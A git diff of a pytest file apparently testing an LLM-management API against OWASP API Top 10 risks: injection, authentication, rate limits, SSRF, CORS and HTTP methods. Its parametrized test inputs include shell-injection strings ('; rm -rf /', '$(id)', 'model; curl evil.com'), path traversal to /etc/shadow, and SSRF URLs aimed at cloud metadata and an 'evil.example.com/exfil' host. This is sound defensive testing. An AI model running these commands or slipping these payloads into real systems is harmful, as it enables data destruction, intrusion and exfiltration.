@@ -1,8 +1,8 @@
 """
-OWASP API Top 10 (2023) — automated coverage tests for llm-valet API.
+OWASP API Top 10 (2023) - automated coverage tests for llm-valet API.
 
 Each class maps to one OWASP API risk category.  Tests verify that security
-controls from CLAUDE.md (T1–T8) are active and effective at runtime, not just
+controls from CLAUDE.md (T1-T8) are active and effective at runtime, not just
 present in source code.
 
 OWASP Testing Guide v4.2 methodology for REST APIs:
@@ -26,6 +26,7 @@ Cross-reference to existing test coverage:
 
 This file adds explicit OWASP-labeled tests for gaps not covered above.
 """
+
 from __future__ import annotations
 
 from unittest.mock import AsyncMock, MagicMock, patch
@@ -51,38 +52,56 @@ _TEST_KEY = "owasp-test-api-key"
 
 # ── Shared helpers ─────────────────────────────────────────────────────────────
 
+
 def _metrics(disk_free_mb: int = 384_000) -> SystemMetrics:
     used_mb = 512_000 - disk_free_mb
     return SystemMetrics(
-        memory=MemoryMetrics(total_mb=16384, used_mb=8192, used_pct=50.0, pressure=PressureLevel.NORMAL),
+        memory=MemoryMetrics(
+            total_mb=16384, used_mb=8192, used_pct=50.0, pressure=PressureLevel.NORMAL
+        ),
         cpu=CPUMetrics(used_pct=5.0, core_count=8),
-        gpu=GPUMetrics(available=False, vram_total_mb=None, vram_used_mb=None, vram_used_pct=None, compute_pct=None),
+        gpu=GPUMetrics(
+            available=False,
+            vram_total_mb=None,
+            vram_used_mb=None,
+            vram_used_pct=None,
+            compute_pct=None,
+        ),
         disk=DiskMetrics(
-            path="/", total_mb=512_000, used_mb=used_mb,
-            free_mb=disk_free_mb, used_pct=round(used_mb / 512_000 * 100, 1),
+            path="/",
+            total_mb=512_000,
+            used_mb=used_mb,
+            free_mb=disk_free_mb,
+            used_pct=round(used_mb / 512_000 * 100, 1),
         ),
     )
 
 
 def _provider() -> MagicMock:
     p = MagicMock()
-    p.status       = AsyncMock(return_value=ProviderStatus(running=True, model_loaded=True, model_name="test:model", memory_used_mb=2000))
-    p.pause        = AsyncMock(return_value=True)
-    p.resume       = AsyncMock(return_value=True)
-    p.stop         = AsyncMock(return_value=True)
-    p.start        = AsyncMock(return_value=True)
+    p.status = AsyncMock(
+        return_value=ProviderStatus(
+            running=True, model_loaded=True, model_name="test:model", memory_used_mb=2000
+        )
+    )
+    p.pause = AsyncMock(return_value=True)
+    p.resume = AsyncMock(return_value=True)
+    p.stop = AsyncMock(return_value=True)
+    p.start = AsyncMock(return_value=True)
     p.health_check = AsyncMock(return_value=True)
-    p.list_models  = AsyncMock(return_value=[ModelInfo(name="test:model", size_mb=2000, context_length=32768)])
-    p.load_model   = AsyncMock(return_value=True)
+    p.list_models = AsyncMock(
+        return_value=[ModelInfo(name="test:model", size_mb=2000, context_length=32768)]
+    )
+    p.load_model = AsyncMock(return_value=True)
     p.delete_model = AsyncMock(return_value=True)
-    p.pull_model   = AsyncMock(return_value=True)
-    p.force_pause  = AsyncMock(return_value=True)
+    p.pull_model = AsyncMock(return_value=True)
+    p.force_pause = AsyncMock(return_value=True)
     return p
 
 
 def _collector(disk_free_mb: int = 384_000) -> MagicMock:
     c = MagicMock()
-    c.collect           = MagicMock(return_value=_metrics(disk_free_mb=disk_free_mb))
+    c.collect = MagicMock(return_value=_metrics(disk_free_mb=disk_free_mb))
     c.supported_metrics = MagicMock(return_value={"memory", "cpu", "gpu", "disk"})
     return c
 
@@ -100,12 +119,14 @@ def _app(
     settings = Settings(
         host=host,
         port=8765,
-        extra_allowed_hosts=extra_allowed_hosts if extra_allowed_hosts is not None else ["testserver"],
+        extra_allowed_hosts=extra_allowed_hosts
+        if extra_allowed_hosts is not None
+        else ["testserver"],
         api_key=api_key,
         thresholds=ResourceThresholds(check_interval_seconds=300),
     )
     with (
-        patch("llm_valet.api._build_provider",  return_value=mp),
+        patch("llm_valet.api._build_provider", return_value=mp),
         patch("llm_valet.api._build_collector", return_value=mc),
         patch("llm_valet.api._check_not_root"),
         patch("llm_valet.api._configure_logging"),
@@ -117,6 +138,7 @@ def _app(
 
 # ── OWASP API1: Broken Object Level Authorization ─────────────────────────────
 
+
 class TestOWASPAPI1BOLA:
     """
     API1:2023 — Object-level access control on model operations.
@@ -125,53 +147,62 @@ class TestOWASPAPI1BOLA:
     limited to: only valid model names may reach provider operations.
     """
 
-    @pytest.mark.parametrize("bad_name", [
-        "../../etc/shadow",
-        "; rm -rf /",
-        "$(id)",
-        "`whoami`",
-        "<script>alert(1)</script>",
-        "model\x00name",
-        "a" * 300,   # oversized name — not matching our regex
-    ])
+    @pytest.mark.parametrize(
+        "bad_name",
+        [
+            "../../etc/shadow",
+            "; rm -rf /",
+            "$(id)",
+            "`whoami`",
+            "<script>alert(1)</script>",
+            "model\x00name",
+            "a" * 300,  # oversized name — not matching our regex
+        ],
+    )
     def test_injection_in_load_rejected(self, bad_name: str) -> None:
         """Malicious object identifiers must be rejected before reaching the provider."""
         app, mock_provider, _ = _app()
         with TestClient(app, raise_server_exceptions=False) as client:
-            r = client.post("/load", json={"model": bad_name},
-                            headers={"X-API-Key": _TEST_KEY})
+            r = client.post("/load", json={"model": bad_name}, headers={"X-API-Key": _TEST_KEY})
             assert r.status_code == 422, f"Expected 422 for model={bad_name!r}"
             mock_provider.load_model.assert_not_called()
 
-    @pytest.mark.parametrize("bad_name", [
-        "; rm -rf /",
-        "$(id)",
-        "../etc/passwd",
-    ])
+    @pytest.mark.parametrize(
+        "bad_name",
+        [
+            "; rm -rf /",
+            "$(id)",
+            "../etc/passwd",
+        ],
+    )
     def test_injection_in_delete_rejected(self, bad_name: str) -> None:
         """Path-param model name is validated before DELETE reaches the provider."""
         app, mock_provider, _ = _app()
         with TestClient(app, raise_server_exceptions=False) as client:
-            r = client.delete(f"/models/{bad_name}",
-                              headers={"X-API-Key": _TEST_KEY})
+            r = client.delete(f"/models/{bad_name}", headers={"X-API-Key": _TEST_KEY})
             assert r.status_code in (422, 404), f"Expected 422/404 for model={bad_name!r}"
             mock_provider.delete_model.assert_not_called()
 
-    @pytest.mark.parametrize("bad_name", [
-        "$(whoami)",
-        "model; curl evil.com",
-    ])
+    @pytest.mark.parametrize(
+        "bad_name",
+        [
+            "$(whoami)",
+            "model; curl evil.com",
+        ],
+    )
     def test_injection_in_pull_rejected(self, bad_name: str) -> None:
         """Pull endpoint validates model name before any provider call."""
         app, mock_provider, _ = _app()
         with TestClient(app, raise_server_exceptions=False) as client:
-            r = client.post("/models/pull", json={"model": bad_name},
-                            headers={"X-API-Key": _TEST_KEY})
+            r = client.post(
+                "/models/pull", json={"model": bad_name}, headers={"X-API-Key": _TEST_KEY}
+            )
             assert r.status_code == 422
             mock_provider.pull_model.assert_not_called()
 
 
 # ── OWASP API2: Broken Authentication ────────────────────────────────────────
+
 
 class TestOWASPAPI2Auth:
     """
@@ -218,18 +249,24 @@ class TestOWASPAPI2Auth:
             r = client.get("/status", headers={"X-API-Key": _TEST_KEY})
             assert r.status_code == 200
 
-    @pytest.mark.parametrize("endpoint", [
-        "/pause", "/resume", "/stop", "/start", "/restart",
-        "/pause/force", "/stop/force",
-    ])
+    @pytest.mark.parametrize(
+        "endpoint",
+        [
+            "/pause",
+            "/resume",
+            "/stop",
+            "/start",
+            "/restart",
+            "/pause/force",
+            "/stop/force",
+        ],
+    )
     def test_auth_required_on_all_mutation_endpoints(self, endpoint: str) -> None:
         """Every POST mutation endpoint must enforce auth — not just /status."""
         app, _, _ = _app(api_key=_TEST_KEY)
         with TestClient(app, raise_server_exceptions=False) as client:
             r = client.post(endpoint)  # no auth header
-            assert r.status_code in (401, 403), (
-                f"{endpoint} returned {r.status_code} without auth"
-            )
+            assert r.status_code in (401, 403), f"{endpoint} returned {r.status_code} without auth"
 
     def test_auth_required_on_put_config(self) -> None:
         """PUT /config without key → 401 (config writes must be authenticated)."""
@@ -245,8 +282,36 @@ class TestOWASPAPI2Auth:
             r = client.post("/load", json={"model": "llama3:latest"})
             assert r.status_code in (401, 403)
 
+    @pytest.mark.parametrize(
+        "bad_key",
+        [
+            "A" * 8192,  # very long — no buffer overrun
+            "'; DROP TABLE users;--",  # SQL-injection style
+            "$(id)",  # shell-injection style
+            "<script>alert(1)</script>",  # XSS-style
+            _TEST_KEY + " trailing-garbage",  # correct prefix, suffix appended
+            " " + _TEST_KEY,  # leading whitespace padding
+        ],
+    )
+    def test_malformed_api_key_returns_401_cleanly(self, bad_key: str) -> None:
+        """
+        Malformed, oversized, or injection-style X-API-Key values must return 401
+        without crashing and without leaking the real key in the response.
+
+        The prefix/suffix cases (correct key + extra chars, leading space) also serve
+        as an indirect timing-safety check: hmac.compare_digest() runs in constant time
+        regardless of where the strings diverge, so these don't get a timing advantage
+        over a fully unrelated key.
+        """
+        app, _, _ = _app(api_key=_TEST_KEY)
+        with TestClient(app, raise_server_exceptions=False) as client:
+            r = client.get("/status", headers={"X-API-Key": bad_key})
+            assert r.status_code == 401, f"Expected 401 for key={bad_key[:40]!r}"
+            assert _TEST_KEY not in r.text
+
 
 # ── OWASP API4: Unrestricted Resource Consumption ────────────────────────────
+
 
 class TestOWASPAPI4ResourceConsumption:
     """
@@ -289,13 +354,16 @@ class TestOWASPAPI4ResourceConsumption:
             )
             assert r.status_code == 413
 
-    @pytest.mark.parametrize("endpoint,interval", [
-        ("/pause",   2.0),
-        ("/resume",  2.0),
-        ("/stop",    3.0),
-        ("/start",   3.0),
-        ("/restart", 3.0),
-    ])
+    @pytest.mark.parametrize(
+        "endpoint,interval",
+        [
+            ("/pause", 2.0),
+            ("/resume", 2.0),
+            ("/stop", 3.0),
+            ("/start", 3.0),
+            ("/restart", 3.0),
+        ],
+    )
     def test_rapid_repeat_calls_rate_limited(self, endpoint: str, interval: float) -> None:
         """Second call within cooldown interval → 429."""
         app, _, _ = _app()
@@ -307,7 +375,8 @@ class TestOWASPAPI4ResourceConsumption:
             assert r2.status_code == 429, f"{endpoint}: second call should be 429"
 
     def test_num_ctx_max_int_rejected(self) -> None:
-        """num_ctx=2^31 is an integer but well beyond Ollama limits — rejected or passed through safely."""
+        """num_ctx=2^31 is an integer but beyond Ollama limits.
+        Must not crash (no 500) — Ollama will reject it downstream."""
         app, mock_provider, _ = _app()
         with TestClient(app, raise_server_exceptions=False) as client:
             r = client.post(
@@ -320,6 +389,7 @@ class TestOWASPAPI4ResourceConsumption:
 
 
 # ── OWASP API5: Broken Function Level Authorization ───────────────────────────
+
 
 class TestOWASPAPI5FunctionLevelAuth:
     """
@@ -363,6 +433,7 @@ class TestOWASPAPI5FunctionLevelAuth:
 
 # ── OWASP API7: Server Side Request Forgery ───────────────────────────────────
 
+
 class TestOWASPAPI7SSRF:
     """
     API7:2023 — SSRF via configurable provider URL.  T6 in CLAUDE.md.
@@ -372,12 +443,15 @@ class TestOWASPAPI7SSRF:
     be redirected to internal services via the API.
     """
 
-    @pytest.mark.parametrize("url", [
-        "http://169.254.169.254/latest/meta-data/",
-        "http://192.0.2.1:6443/api/v1/secrets",  # RFC 5737 TEST-NET — not routable
-        "file:///etc/passwd",
-        "http://evil.example.com/exfil",
-    ])
+    @pytest.mark.parametrize(
+        "url",
+        [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://192.0.2.1:6443/api/v1/secrets",  # RFC 5737 TEST-NET — not routable
+            "file:///etc/passwd",
+            "http://evil.example.com/exfil",
+        ],
+    )
     def test_ssrf_via_ollama_url_in_config_silently_dropped(self, url: str) -> None:
         """ollama_url injection via PUT /config → silently ignored (not a threshold field)."""
         app, _, _ = _app()
@@ -407,6 +481,7 @@ class TestOWASPAPI7SSRF:
 
 
 # ── OWASP API8: Security Misconfiguration ────────────────────────────────────
+
 
 class TestOWASPAPI8SecurityMisconfiguration:
     """
@@ -448,10 +523,13 @@ class TestOWASPAPI8SecurityMisconfiguration:
         """
         app, _, _ = _app()
         with TestClient(app, raise_server_exceptions=False) as client:
-            r = client.get("/status", headers={
-                "X-API-Key": _TEST_KEY,
-                "Origin": "https://evil.example.com",
-            })
+            r = client.get(
+                "/status",
+                headers={
+                    "X-API-Key": _TEST_KEY,
+                    "Origin": "https://evil.example.com",
+                },
+            )
             acao = r.headers.get("access-control-allow-origin", "")
             assert acao != "*", "Wildcard CORS origin must never be set"
             assert "evil.example.com" not in acao, "Arbitrary origin must not be echoed"
@@ -460,10 +538,13 @@ class TestOWASPAPI8SecurityMisconfiguration:
         """OPTIONS preflight for unlisted origin must not include allow-all."""
         app, _, _ = _app()
         with TestClient(app, raise_server_exceptions=False) as client:
-            r = client.options("/status", headers={
-                "Origin": "https://evil.example.com",
-                "Access-Control-Request-Method": "GET",
-            })
+            r = client.options(
+                "/status",
+                headers={
+                    "Origin": "https://evil.example.com",
+                    "Access-Control-Request-Method": "GET",
+                },
+            )
             acao = r.headers.get("access-control-allow-origin", "")
             assert acao != "*"
             assert "evil.example.com" not in acao
@@ -484,12 +565,15 @@ class TestOWASPAPI8SecurityMisconfiguration:
             assert r.status_code == 403
             assert "owasp-test-api-key" not in r.text
 
-    @pytest.mark.parametrize("bad_method_endpoint", [
-        ("DELETE", "/status"),
-        ("DELETE", "/pause"),
-        ("PATCH",  "/config"),
-        ("PUT",    "/pause"),
-    ])
+    @pytest.mark.parametrize(
+        "bad_method_endpoint",
+        [
+            ("DELETE", "/status"),
+            ("DELETE", "/pause"),
+            ("PATCH", "/config"),
+            ("PUT", "/pause"),
+        ],
+    )
     def test_disallowed_http_methods_rejected(self, bad_method_endpoint: tuple) -> None:
         """
         Endpoints must only respond to their declared methods.
@@ -499,12 +583,11 @@ class TestOWASPAPI8SecurityMisconfiguration:
         app, _, _ = _app()
         with TestClient(app, raise_server_exceptions=False) as client:
             r = client.request(method, endpoint, headers={"X-API-Key": _TEST_KEY})
-            assert r.status_code == 405, (
-                f"{method} {endpoint} should be 405, got {r.status_code}"
-            )
+            assert r.status_code == 405, f"{method} {endpoint} should be 405, got {r.status_code}"
 
 
 # ── OWASP API9: Improper Inventory Management ────────────────────────────────
+
 
 class TestOWASPAPI9InventoryManagement:
     """
@@ -517,14 +600,15 @@ class TestOWASPAPI9InventoryManagement:
     def test_status_returns_version(self) -> None:
         """GET /status must include a parseable version string."""
         import re
+
         app, _, _ = _app()
         with TestClient(app, raise_server_exceptions=False) as client:
             r = client.get("/status", headers={"X-API-Key": _TEST_KEY})
             data = r.json()
             assert "version" in data
-            assert re.match(r"^\d+\.\d+\.\d+$", data["version"]), (
-                f"version {data['version']!r} does not match semver format"
-            )
+            assert re.match(
+                r"^\d+\.\d+\.\d+$", data["version"]
+            ), f"version {data['version']!r} does not match semver format"
 
     def test_openapi_docs_accessible(self) -> None:
         """GET /docs must return 200 — operators must be able to inspect the API surface."""
